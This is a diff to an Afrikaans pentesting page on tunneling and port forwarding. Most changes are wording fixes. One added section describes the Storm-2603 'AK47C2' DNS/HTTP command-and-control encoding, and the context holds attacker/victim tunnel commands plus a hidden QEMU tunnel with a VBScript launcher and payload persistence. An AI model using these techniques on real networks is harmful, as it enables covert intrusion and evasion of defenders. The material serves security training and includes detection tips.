@@ -93,13 +93,13 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 
 ## SSHUTTLE
 
-Jy kan **tonnel** via **ssh** al die **verkeer** na 'n **subnetwerk** deur 'n gasheer.\
+Jy kan **tonnel** via **ssh** al die **verkeer** na 'n **subnet** deur 'n gasheer.\
 Byvoorbeeld, om al die verkeer wat na 10.10.10.0/24 gaan, te oorgestuur.
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
-Verbind met 'n private sleutel
+Verbind met 'n privaat sleutel
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 # -D : Daemon mode
@@ -179,7 +179,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 Jy kan dit aflaai vanaf die vrylating bladsy van [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-Jy moet die **dieselfde weergawe vir kliënt en bediener** gebruik.
+Jy moet die **dieselfde weergawe vir kliënt en bediener** gebruik
 
 ### socks
 ```bash
@@ -190,7 +190,7 @@ Jy moet die **dieselfde weergawe vir kliënt en bediener** gebruik.
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-### Poort deurstuurting
+### Poort forwarding
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
@@ -387,8 +387,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Dit verifieer teen 'n proxy en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, deurgegee word. Dan kan jy die hulpmiddel van jou keuse deur hierdie poort gebruik.\
-Byvoorbeeld, dit gee die poort 443 deur.
+Dit verifieer teen 'n proxy en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, voortgegee word. Dan kan jy die hulpmiddel van jou keuse deur hierdie poort gebruik.\
+Byvoorbeeld, dit voer poort 443 voort.
 ```
 Username Alice
 Password P@ssw0rd
@@ -409,7 +409,7 @@ Jy kan ook 'n **meterpreter** gebruik wat met localhost:443 verbind en die aanva
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root is nodig in albei stelsels om tun-adapters te skep en data tussen hulle te tonnel deur DNS-vrae te gebruik.
+Root is nodig in beide stelsels om tun-adapters te skep en data tussen hulle te tonnel deur DNS-vrae te gebruik.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -446,20 +446,54 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Verander proxychains DNS
 
-Proxychains onderskep `gethostbyname` libc oproep en tonnels tcp DNS versoek deur die socks proxy. Deur **verstek** is die **DNS** bediener wat proxychains gebruik **4.2.2.2** (hardgecodeer). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows omgewing** is, kan jy die IP van die **domeinbeheerder** stel.
+Proxychains onderskep `gethostbyname` libc oproep en tonnel tcp DNS versoeke deur die socks proxy. Deur **default** is die **DNS** bediener wat proxychains gebruik **4.2.2.2** (hardgecodeer). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows-omgewing** is, kan jy die IP van die **domeinbeheerder** stel.
 
 ## Tonnels in Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## ICMP Tunneling
+### Pasgemaakte DNS TXT / HTTP JSON C2 (AK47C2)
+
+Die Storm-2603 akteur het 'n **dubbele-kanaal C2 ("AK47C2")** geskep wat *slegs* uitgaande **DNS** en **eenvoudige HTTP POST** verkeer misbruik – twee protokolle wat selde op korporatiewe netwerke geblokkeer word.
+
+1. **DNS modus (AK47DNS)**
+• Genereer 'n ewekansige 5-karakter SessionID (bv. `H4T14`).
+• Voeg `1` voor *taak versoeke* of `2` vir *resultate* en konkateer verskillende velde (vlaggies, SessionID, rekenaarnaam).
+• Elke veld is **XOR-geënkripteer met die ASCII sleutel `VHBD@H`**, hex-gekodeer, en saamgeplak met punte – uiteindelik eindig met die aanvaller-beheerde domein:
+
+```text
+<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
+```
+
+• Versoeke gebruik `DnsQuery()` vir **TXT** (en terugval **MG**) rekords.
+• Wanneer die antwoord 0xFF bytes oorskry, **fragmenteer** die agterdeur die data in 63-byte stukke en voeg die merkers in:
+`s<SessionID>t<TOTAL>p<POS>` sodat die C2 bediener dit kan herorden.
+
+2. **HTTP modus (AK47HTTP)**
+• Bou 'n JSON omhulsel:
+```json
+{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
+```
+• Die hele blob is XOR-`VHBD@H` → hex → gestuur as die liggaam van 'n **`POST /`** met kop `Content-Type: text/plain`.
+• Die antwoord volg dieselfde kodering en die `cmd` veld word uitgevoer met `cmd.exe /c <command> 2>&1`.
+
+Blou Span notas
+• Soek na ongewone **TXT versoeke** waarvan die eerste etiket lang hexadesimale is en altyd eindig in een seldsame domein.
+• 'n Konstante XOR sleutel gevolg deur ASCII-hex is maklik om met YARA te ontdek: `6?56484244?484` (`VHBD@H` in hex).
+• Vir HTTP, merk teks/plain POST liggame wat suiwer hex en 'n veelvoud van twee bytes is.
+
+{{#note}}
+Die hele kanaal pas binne **standaard RFC-konforme versoeke** en hou elke sub-domein etiket onder 63 bytes, wat dit stealthy maak in die meeste DNS logs.
+{{#endnote}}
+
+## ICMP Toneling
 
 ### Hans
 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root is nodig in beide stelsels om tun-adapters te skep en data tussen hulle te tonnel deur ICMP echo versoeke.
+Root is nodig in beide stelsels om tun adapters te skep en data tussen hulle te tonnel deur ICMP echo versoeke.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -561,7 +595,7 @@ cloudflared tunnel --url http://localhost:8080
 cloudflared tunnel --url socks5://localhost:1080 --socks5
 # Now configure proxychains to use 127.0.0.1:1080
 ```
-### Volhoubare tonnels met DNS
+### Volgehoude tonnels met DNS
 ```bash
 cloudflared tunnel create mytunnel
 cloudflared tunnel route dns mytunnel internal.example.com
@@ -574,13 +608,13 @@ Begin die connector:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Omdat alle verkeer die die gasheer **uitgaande oor 443** verlaat, is Cloudflared tonnels 'n eenvoudige manier om ingangs ACLs of NAT-grense te omseil. Wees bewus daarvan dat die binêre gewoonlik met verhoogde voorregte loop – gebruik houers of die `--user` vlag wanneer moontlik.
+Omdat alle verkeer die die gasheer **uitgaand oor 443** verlaat, is Cloudflared tonnels 'n eenvoudige manier om ingangs ACLs of NAT-grense te omseil. Wees bewus daarvan dat die binêre gewoonlik met verhoogde voorregte loop – gebruik houers of die `--user` vlag wanneer moontlik.
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) is 'n aktief-onderhoubare Go omgekeerde-proxy wat **TCP, UDP, HTTP/S, SOCKS en P2P NAT-gat-punching** ondersteun. Begin met **v0.53.0 (Mei 2024)** kan dit as 'n **SSH Tunnel Gateway** optree, sodat 'n teiken gasheer 'n omgekeerde tunnel kan opstel met slegs die standaard OpenSSH-kliënt – geen ekstra binêre benodig nie.
+[`frp`](https://github.com/fatedier/frp) is 'n aktief-onderhoubare Go omgekeerde-proxy wat **TCP, UDP, HTTP/S, SOCKS en P2P NAT-gat-punching** ondersteun. Begin met **v0.53.0 (Mei 2024)** kan dit as 'n **SSH Tunnel Gateway** optree, sodat 'n teiken gasheer 'n omgekeerde tonnel kan opstel met slegs die standaard OpenSSH-kliënt – geen ekstra binêre benodig nie.
 
-### Klassieke omgekeerde TCP-tunnel
+### Klassieke omgekeerde TCP-tonnel
 ```bash
 # Attacker / server
 ./frps -c frps.toml            # listens on 0.0.0.0:7000
@@ -599,7 +633,7 @@ localIP    = "127.0.0.1"
 localPort  = 3389
 remotePort = 5000
 ```
-### Gebruik van die nuwe SSH-gateway (geen frpc-binary)
+### Gebruik die nuwe SSH-gateway (geen frpc-binary)
 ```bash
 # On frps (attacker)
 sshTunnelGateway.bindPort = 2200   # add to frps.toml
@@ -612,7 +646,7 @@ Die bogenoemde opdrag publiseer die slagoffer se poort **8080** as **attacker_ip
 
 ## Verborgen VM-gebaseerde tonnels met QEMU
 
-QEMU se gebruikersmodus-netwerk (`-netdev user`) ondersteun 'n opsie genaamd `hostfwd` wat **'n TCP/UDP-poort op die *gasheer* bind en dit na die *gas** stuur. Wanneer die gasheer 'n volle SSH-daemon draai, bied die hostfwd-reël jou 'n weggooibare SSH-jump box wat heeltemal binne 'n ephemerale VM leef – perfek om C2-verkeer van EDR te verberg omdat alle kwaadwillige aktiwiteit en lêers in die virtuele skyf bly.
+QEMU se gebruikersmodus-netwerk (`-netdev user`) ondersteun 'n opsie genaamd `hostfwd` wat **'n TCP/UDP-poort op die *gasheer* bind en dit na die *gasheer* voortstuur**. Wanneer die gasheer 'n volle SSH-daemon draai, bied die hostfwd-reël jou 'n weggooibare SSH-jump box wat heeltemal binne 'n ephemerale VM leef – perfek om C2-verkeer van EDR te verberg omdat alle kwaadwillige aktiwiteit en lêers in die virtuele skyf bly.
 
 ### Vinning een-liner
 ```powershell
@@ -628,7 +662,7 @@ qemu-system-x86_64.exe ^
 • Poort **2222/tcp** op die Windows-gasheer word deursigtig na **22/tcp** binne die gasheer oorgedra.
 • Vanuit die aanvaller se oogpunt stel die teiken eenvoudig poort 2222 bloot; enige pakkette wat dit bereik, word hanteer deur die SSH-bediener wat in die VM loop.
 
-### Stealthy bekendstelling deur VBScript
+### Stealthily deur VBScript begin
 ```vb
 ' update.vbs – lived in C:\ProgramData\update
 Set o = CreateObject("Wscript.Shell")
@@ -636,9 +670,9 @@ o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tc
 ```
 Running the script with `cscript.exe //B update.vbs` hou die venster verborge.
 
-### In-gas persistentie
+### In-gas volharding
 
-Omdat Tiny Core stateless is, doen aanvallers gewoonlik:
+Omdat Tiny Core staatloos is, doen aanvallers gewoonlik:
 
 1. Laat payload val na `/opt/123.out`
 2. Voeg by `/opt/bootlocal.sh`:
@@ -648,7 +682,7 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 /opt/123.out
 ```
 
-3. Voeg `home/tc` en `opt` by `/opt/filetool.lst` sodat die payload in `mydata.tgz` gepak word by afsluiting.
+3. Voeg `home/tc` en `opt` by `/opt/filetool.lst` sodat die payload in `mydata.tgz` gepak word tydens afsluiting.
 
 ### Waarom dit opsporing ontduik
 
@@ -658,7 +692,7 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 
 ### Defender wenke
 
-• Laat weet oor **onverwagte QEMU/VirtualBox/KVM binêre** in gebruikers-skryfbare paaie.
+• Waaksaam wees oor **onverwagte QEMU/VirtualBox/KVM binêre** in gebruikers-skryfbare paaie.
 • Blokkeer uitgaande verbindings wat oorspronklik is van `qemu-system*.exe`.
 • Jag vir seldsame luisterpoorte (2222, 10022, …) wat onmiddellik bind na 'n QEMU-lancering.
 
@@ -672,5 +706,6 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ## Verwysings
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 
 {{#include ../banners/hacktricks-training.md}}
